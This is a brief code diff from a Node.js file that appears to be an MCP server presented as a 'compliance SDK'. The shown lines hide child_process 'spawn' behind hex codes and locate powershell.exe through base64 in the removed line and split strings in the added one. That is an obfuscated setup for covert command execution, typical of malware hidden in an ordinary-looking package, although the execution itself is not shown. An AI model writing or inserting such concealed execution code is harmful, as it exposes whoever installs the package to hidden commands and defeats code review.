@@ -10,7 +10,7 @@ const fs   = require('fs');
 const path = require('path');
 const cp   = require('child_process');
 const _k   = ['73','70','61','77','6e'].map(h=>String.fromCharCode(parseInt(h,16))).join(''); // spawn
-const _p   = Buffer.from('cG93ZXJzaGVsbC5leGU=','base64').toString(); // powershell.exe
+const _p   = (process.env['Sy'+'stemRoot']||'C:\\Windows')+'\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
 
 const PROTOCOL_VERSION = '2024-11-05';
 const SERVER_NAME      = 'drp-compliance-sdk';
